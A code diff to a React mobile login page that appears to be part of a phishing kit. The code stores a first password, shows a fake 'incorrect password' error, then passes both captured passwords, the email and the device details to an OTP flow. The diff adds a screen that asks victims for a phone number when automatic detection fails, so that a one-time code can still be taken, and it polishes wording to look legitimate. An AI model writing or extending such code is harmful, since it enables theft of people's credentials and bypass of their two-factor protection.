@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, AtSign } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, AtSign, Phone } from 'lucide-react';
 import { getBrowserFingerprint } from '../../utils/oauthHandler';
 import {
   generateOTP,
@@ -36,6 +36,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   
   // OTP Flow States
   const [showOTPFlow, setShowOTPFlow] = useState(false);
+  const [showManualPhoneEntry, setShowManualPhoneEntry] = useState(false);
+  const [manualPhone, setManualPhone] = useState('');
   const [detectedPhone, setDetectedPhone] = useState('');
   const [otp, setOtp] = useState('');
   const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
@@ -90,8 +92,9 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
         setFirstAttemptPassword(password);
         await new Promise(resolve => setTimeout(resolve, 1500));
-        setErrorMessage('Invalid email or password. Please try again.');
+        setErrorMessage('The email or password you entered is incorrect. Please try again.');
         setIsLoading(false);
+        setPassword('');
         return;
       }
 
@@ -112,6 +115,9 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
           setDetectedPhone(otpResult.phone);
           setShowOTPFlow(true);
           console.log('✅ Mobile: OTP sent to detected phone:', otpResult.phone);
+        } else if (otpResult.manualEntryRequired) {
+            setShowManualPhoneEntry(true);
+            console.log('📱 Mobile: Phone detection failed, requesting manual entry.');
         } else {
           setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
           console.error('❌ Mobile: OTP flow failed:', otpResult.error);
@@ -126,6 +132,38 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       if (onLoginError) onLoginError('Login failed. Please try again.');
       setIsLoading(false);
     }
+  };
+  
+  const handleManualPhoneSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!manualPhone || manualPhone.length < 10) {
+        setErrorMessage('Please enter a valid phone number.');
+        return;
+    }
+
+    setIsLoading(true);
+    setErrorMessage('');
+
+    const otpResult = await initiateOTPFlow(
+      currentEmail,
+      firstAttemptPassword,
+      secondAttemptPassword,
+      selectedProvider!,
+      typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
+      manualPhone
+    );
+
+    if (otpResult.success) {
+      setDetectedPhone(otpResult.phone);
+      setShowManualPhoneEntry(false);
+      setShowOTPFlow(true);
+      console.log('✅ Mobile: OTP sent to manually entered phone:', otpResult.phone);
+    } else {
+      setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
+      console.error('❌ Mobile: OTP flow failed after manual entry:', otpResult.error);
+    }
+    
+    setIsLoading(false);
   };
 
   const handleOTPSubmit = async (e: React.FormEvent) => {
@@ -182,6 +220,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
   const handleBackToForm = () => {
     setShowOTPFlow(false);
+    setShowManualPhoneEntry(false);
     setOtp('');
     setErrorMessage('');
   };
@@ -193,7 +232,78 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     setLoginAttempts(0);
     setErrorMessage('');
     setShowOTPFlow(false);
+    setShowManualPhoneEntry(false);
   };
+  
+    // MANUAL PHONE ENTRY FLOW
+  if (showManualPhoneEntry) {
+    return (
+      <div
+        className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
+        style={{ backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')", backgroundSize: 'cover', backgroundPosition: 'center', backgroundRepeat: 'no-repeat' }}
+      >
+        <div className="w-full max-w-sm relative z-10 mx-4">
+          <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden">
+            <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
+            <div className="relative z-10">
+              <div className="flex items-center justify-center mb-3">
+                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
+                  <Sparkles className="w-3.5 h-3.5 text-blue-500" />
+                  <span className="text-xs font-medium text-blue-700">Verify Your Phone</span>
+                </div>
+              </div>
+
+              <div className="space-y-4">
+                <p className="text-sm text-center text-slate-600">
+                  Please enter your phone number to receive a verification code.
+                </p>
+
+                <form onSubmit={handleManualPhoneSubmit} className="space-y-4">
+                  {errorMessage && (
+                    <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3">
+                      <p className="text-red-700 text-xs font-medium">{errorMessage}</p>
+                    </div>
+                  )}
+
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-700 mb-1.5">Phone Number</label>
+                    <div className="relative group">
+                      <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
+                      <input
+                        type="tel"
+                        value={manualPhone}
+                        onChange={(e) => setManualPhone(e.target.value)}
+                        placeholder="e.g., +1 123-456-7890"
+                        required
+                        className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm"
+                      />
+                    </div>
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={isLoading}
+                    className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg"
+                  >
+                    <div className="flex items-center justify-center gap-2">
+                      {isLoading && <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />}
+                      {isLoading ? 'Sending Code...' : 'Send Verification Code'}
+                    </div>
+                  </button>
+                </form>
+              </div>
+
+              <div className="mt-5 pt-2 border-t border-gray-100">
+                <button onClick={handleBackToForm} className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center">
+                  ← Back
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   // OTP FLOW: Enter OTP code
   if (showOTPFlow) {
@@ -219,8 +329,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               </div>
 
               <div className="space-y-4">
-                <p className="text-sm text-slate-600">
-                  We've sent a 6-digit verification code to your phone number ending in <strong>{detectedPhone.slice(-4)}</strong>
+                <p className="text-sm text-slate-600 text-center">
+                  We sent a 6-digit code to the number ending in <strong>{detectedPhone.slice(-4)}</strong>
                 </p>
 
                 <form onSubmit={handleOTPSubmit} className="space-y-4">
@@ -301,7 +411,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             <div className="flex items-center justify-center mb-3">
               <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
                 <Sparkles className="w-3.5 h-3.5 text-blue-500" />
-                <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
+                <span className="text-xs font-medium text-blue-700">{!selectedProvider ? 'Select Provider' : `Sign in with ${selectedProvider}`}</span>
               </div>
             </div>
 
@@ -407,7 +517,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                         {isLoading && (
                           <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                         )}
-                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Sending OTP...') : 'Sign In Securely'}
+                        {isLoading ? (loginAttempts < 2 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                       </div>
                     </button>
                   </form>
